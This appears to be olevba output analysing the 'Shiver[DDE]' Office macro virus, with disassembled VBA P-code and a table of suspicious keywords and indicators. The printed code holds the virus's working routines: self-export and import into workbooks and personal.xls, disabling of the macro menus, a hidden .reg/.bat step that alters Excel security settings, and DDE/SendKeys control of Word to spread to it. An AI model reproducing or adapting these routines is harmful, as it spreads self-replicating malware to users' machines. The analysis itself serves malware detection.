' 	ArgsCall (Call) xlTrigger 0x0000 
' Line #186:
' Line #187:
' 	Ld ActiveWorkbook 
' 	MemLd New 
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0004 "BOOK"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	BoS 0x0000 
' 	EndIf 
' Line #188:
' Line #189:
' 	LitStr 0x000D "c:\shiver.sys"
' 	LitStr 0x0007 "Module1"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #190:
' Line #191:
' 	LitVarSpecial (False)
' 	LitStr 0x0009 "Unhide..."
' 	LitStr 0x0006 "Window"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #192:
' 	LitVarSpecial (False)
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #193:
' Line #194:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x000D "\personal.xls"
' 	Add 
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x000C "personal.xls"
' 	ArgsLd UCase 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St PXLS 
' 	EndIf 
' Line #195:
' Line #196:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveWorkbook 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #197:
' 	Ld i 
' 	Ld ActiveWorkbook 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0007 "Module1"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St SXLS 
' 	EndIf 
' Line #198:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #199:
' Line #200:
' 	Ld SXLS 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #201:
' 	LitStr 0x000D "c:\shiver.sys"
' 	Paren 
' 	Ld ActiveWorkbook 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #202:
' 	Ld ActiveWorkbook 
' 	ArgsMemCall Save 0x0000 
' Line #203:
' 	EndIfBlock 
' Line #204:
' Line #205:
' 	Ld PXLS 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #206:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x000D "\personal.xls"
' 	Concat 
' 	ParamNamed FileName 
' 	Ld xlNormal 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToMru 
' 	Ld Workbooks 
' 	MemLd Add 
' 	ArgsMemCall SaveAs 0x0003 
' Line #207:
' 	LitStr 0x000D "c:\shiver.sys"
' 	Paren 
' 	Ld ActiveWorkbook 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #208:
' 	LitVarSpecial (False)
' 	Ld ActiveWindow 
' 	MemSt Visible 
' Line #209:
' 	LitStr 0x000C "personal.xls"
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemCall Save 0x0000 
' Line #210:
' 	EndIfBlock 
' Line #211:
' Line #212:
' 	Label out 
' Line #213:
' Line #214:
' 	LitStr 0x0009 "c:\o6.reg"
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0006 "O6.REG"
' 	Ne 
' 	LitStr 0x0009 "c:\o6.bat"
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0006 "O6.BAT"
' 	Ne 
' 	Or 
' 	IfBlock 
' Line #215:
' Line #216:
' 	LitStr 0x0009 "c:\o6.reg"
' 	LitDI2 0x0001 
' 	LitDefault 
' 	Open (For Output)
' Line #217:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "REGEDIT4"
' 	PrintItemNL 
' Line #218:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0047 "[HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel]"
' 	PrintItemNL 
' Line #219:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0019 ""Options6"=dword:00000000"
' 	PrintItemNL 
' Line #220:
' 	LitDI2 0x0001 
' 	Close 0x0001 
' Line #221:
' Line #222:
' 	LitStr 0x0009 "c:\o6.bat"
' 	LitDI2 0x0001 
' 	LitDefault 
' 	Open (For Output)
' Line #223:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "regedit /s c:\o6.reg"
' 	PrintItemNL 
' Line #224:
' 	LitDI2 0x0001 
' 	Close 0x0001 
' Line #225:
' 	EndIfBlock 
' Line #226:
' Line #227:
' 	EndSub 
' Line #228:
' Line #229:
' 	FuncDefn (Sub wdTrigger())
' Line #230:
' 	OnError (Resume Next) 
' Line #231:
' 	ArgsCall Read 0x0000 
' Line #232:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #233:
' 	LitVarSpecial (False)
' 	St ShowVisualBasicEditor 
' Line #234:
' 	Ld Rnd 
' 	LitDI2 0x0320 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0259 
' 	Eq 
' 	IfBlock 
' Line #235:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0010 
' 	For 
' Line #236:
' 	Ld Selection 
' 	ArgsMemCall WholeStory 0x0000 
' Line #237:
' 	Ld x 
' 	Ld Selection 
' 	MemLd Range 
' 	MemSt HighlightColorIndex 
' Line #238:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x4240 0x000F 
' 	For 
' Line #239:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	NextVar 
' Line #240:
' 	Ld x 
' 	LitDI2 0x0003 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	Ld x 
' 	Ld Rnd 
' 	LitDI2 0x0003 
' 	Mul 
' 	FnInt 
' 	Sub 
' 	St x 
' 	EndIf 
' Line #241:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #242:
' 	QuoteRem 0x0000 0x0014 " REM Bad Payload REM"
' Line #243:
' 	QuoteRem 0x0000 0x006A "System.PrivateProfileString("", "HKEY_CLASSES_ROOT\Word.Document.8\shell\open\ddeexec", "") = "[FileExit]""
' Line #244:
' 	QuoteRem 0x0000 0x0068 "System.PrivateProfileString("", "HKEY_CLASSES_ROOT\Excel.Sheet.8\shell\Open\ddeexec", "") = "[FileExit]""
' Line #245:
' 	QuoteRem 0x0000 0x0014 " REM Bad Payload REM"
' Line #246:
' 	EndIfBlock 
' Line #247:
' 	EndSub 
' Line #248:
' Line #249:
' 	FuncDefn (Sub xlTrigger())
' Line #250:
' 	OnError (Resume Next) 
' Line #251:
' 	ArgsCall Read 0x0000 
' Line #252:
' 	Ld xlDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #253:
' 	Ld Rnd 
' 	LitDI2 0x0320 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0259 
' 	Eq 
' 	IfBlock 
' Line #254:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x001E 
' 	For 
' Line #255:
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x000C 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Ld x 
' 	Concat 
' 	St RR 
' Line #256:
' 	Ld RR 
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall AddComment 0x0000 
' Line #257:
' 	LitVarSpecial (True)
' 	Ld RR 
' 	ArgsLd Range 0x0001 
' 	MemLd Comment 
' 	MemSt Visible 
' Line #258:
' 	LitStr 0x0016 "Shiver[DDE] by ALT-F11"
' 	ParamNamed Then 
' 	Ld RR 
' 	ArgsLd Range 0x0001 
' 	MemLd Comment 
' 	ArgsMemCall Then 0x0001 
' Line #259:
' 	LitVarSpecial (True)
' 	Ld RR 
' 	ArgsLd Range 0x0001 
' 	MemLd Comment 
' 	MemLd Shape 
' 	ArgsMemCall Set 0x0001 
' Line #260:
' 	Ld Rnd 
' 	LitDI2 0x012C 
' 	Mul 
' 	FnInt 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	ArgsMemCall IncrementLeft 0x0001 
' Line #261:
' 	Ld Rnd 
' 	LitDI2 0x012C 
' 	Mul 
' 	FnInt 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	ArgsMemCall IncrementTop 0x0001 
' Line #262:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #263:
' 	EndIfBlock 
' Line #264:
' 	EndSub 
' Line #265:
' Line #266:
' Line #267:
' 	FuncDefn (Sub Auto_Close())
' Line #268:
' Line #269:
' 	OnError out 
' Line #270:
' Line #271:
' 	ArgsCall (Call) CheckMarker 0x0000 
' Line #272:
' Line #273:
' 	LitStr 0x0007 "OpusApp"
' 	ArgsLd FindApp 0x0001 
' 	St hWnd 
' Line #274:
' Line #275:
' 	Ld hWnd 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St WordFound 
' 	EndIf 
' Line #276:
' Line #277:
' 	Ld WordFound 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld Marker 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	IfBlock 
' Line #278:
' Line #279:
' 	Ld Application 
' 	MemLd Path 
' 	LitStr 0x000C "\winword.exe"
' 	Concat 
' 	Ld vbMinimizedFocus 
' 	ArgsCall Shell 0x0002 
' Line #280:
' 	LitStr 0x0006 "MSWord"
' 	LitStr 0x0006 "system"
' 	Ld Application 
' 	ArgsMemLd DDEInitiate 0x0002 
' 	St CNL 
' Line #281:
' 	Ld CNL 
' 	LitStr 0x000B "[fileclose]"
' 	Ld Application 
' 	ArgsMemCall DDEExecute 0x0002 
' Line #282:
' 	Ld CNL 
' 	LitStr 0x0013 "[Sendkeys "%{F11}"]"
' 	Ld Application 
' 	ArgsMemCall DDEExecute 0x0002 
' Line #283:
' 	Ld CNL 
' 	LitStr 0x000F "[Sendkeys "^m"]"
' 	Ld Application 
' 	ArgsMemCall DDEExecute 0x0002 
' Line #284:
' 	ArgsCall (Call) delay 0x0000 
' Line #285:
' 	LitStr 0x000D "c:\shiver.sys"
' 	Ld Wait 
' 	ArgsCall SendKeys 0x0002 
' Line #286:
' 	LitStr 0x0002 "%o"
' 	ArgsCall SendKeys 0x0001 
' Line #287:
' 	Ld CNL 
' 	LitStr 0x0012 "[Sendkeys "%{F4}"]"
' 	Ld Application 
' 	ArgsMemCall DDEExecute 0x0002 
' Line #288:
' 	Ld CNL 
' 	LitStr 0x0012 "[Sendkeys "%{F4}"]"
' 	Ld Application 
' 	ArgsMemCall DDEExecute 0x0002 
' Line #289:
' 	Ld CNL 
' 	LitStr 0x000E "[Sendkeys "y"]"
' 	Ld Application 
' 	ArgsMemCall DDEExecute 0x0002 
' Line #290:
' 	Ld CNL 
' 	Ld Application 
' 	ArgsMemCall DDETerminate 0x0001 
' Line #291:
' Line #292:
' 	ArgsCall (Call) MakeMarker 0x0000 
' Line #293:
' Line #294:
' 	LitVarSpecial (True)
' 	St JustRun 
' Line #295:
' Line #296:
' 	EndIfBlock 
' Line #297:
' Line #298:
' 	Label out 
' Line #299:
' Line #300:
' 	OnError (Resume Next) 
' Line #301:
' 	LitStr 0x0009 "c:\o6.bat"
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #302:
' Line #303:
' 	Ld Rnd 
' 	LitDI2 0x001E 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0005 
' 	Eq 
' 	Paren 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) xlReEvalInfection 0x0000 
' 	EndIf 
' Line #304:
' Line #305:
' 	EndSub 
' Line #306:
' Line #307:
' 	FuncDefn (Sub delay())
' Line #308:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Hour 0x0001 
' 	St newHour 
' Line #309:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Minute 0x0001 
' 	St newMinute 
' Line #310:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Second 0x0001 
' 	LitDI2 0x0002 
' 	Add 
' 	St newSecond 
' Line #311:
' 	Ld newHour 
' 	Ld newMinute 
' 	Ld newSecond 
' 	ArgsLd TimeSerial 0x0003 
' 	St waitTime 
' Line #312:
' 	Ld waitTime 
' 	Ld Application 
' 	ArgsMemCall Wait 0x0001 
' Line #313:
' 	EndSub 
' Line #314:
' Line #315:
' 	FuncDefn (Sub wdReEvalInfection())
' Line #316:
' 	Ld Application 
' 	MemLd Path 
' 	LitStr 0x0015 "\xlstart\personal.xls"
' 	Add 
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x000C "PERSONAL.XLS"
' 	Ne 
' 	Ld Marker 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	Ld JustRun 
' 	LitVarSpecial (True)
' 	Ne 
' 	And 
' 	IfBlock 
' Line #317:
' 	LitStr 0x0006 "NoNoNo"
' 	LitStr 0x0000 ""
' 	LitStr 0x0041 "HKEY_CURRENT_USER\Software\VB and VBA Program Settings\Office\8.0"
' 	LitStr 0x000B "Shiver[DDE]"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #318:
' 	EndIfBlock 
' Line #319:
' 	EndSub 
' Line #320:
' Line #321:
' 	FuncDefn (Sub xlReEvalInfection())
' Line #322:
' 	Ld Application 
' 	MemLd Path 
' 	LitStr 0x0012 "\startup\Word8.dot"
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0009 "WORD8.DOT"
' 	Ne 
' 	Ld Marker 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	Ld JustRun 
' 	LitVarSpecial (True)
' 	Ne 
' 	And 
' 	IfBlock 
' Line #323:
' 	LitStr 0x0006 "Office"
' 	LitStr 0x0003 "8.0"
' 	LitStr 0x000B "Shiver[DDE]"
' 	LitStr 0x0006 "NoNoNo"
' 	ArgsCall SaveSetting 0x0004 
' Line #324:
' 	EndIfBlock 
' Line #325:
' 	EndSub 
' Line #326:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|AutoExec  |Auto_Close          |Runs when the Excel Workbook is closed       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbMinimizedFocus    |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|FindWindow          |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Sendkeys            |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
|IOC       |Excel.exe           |Executable file name                         |
|IOC       |o6.reg              |Executable file name                         |
|IOC       |O6.REG              |Executable file name                         |
|IOC       |o6.bat              |Executable file name                         |
|IOC       |O6.BAT              |Executable file name                         |
|IOC       |winword.exe         |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

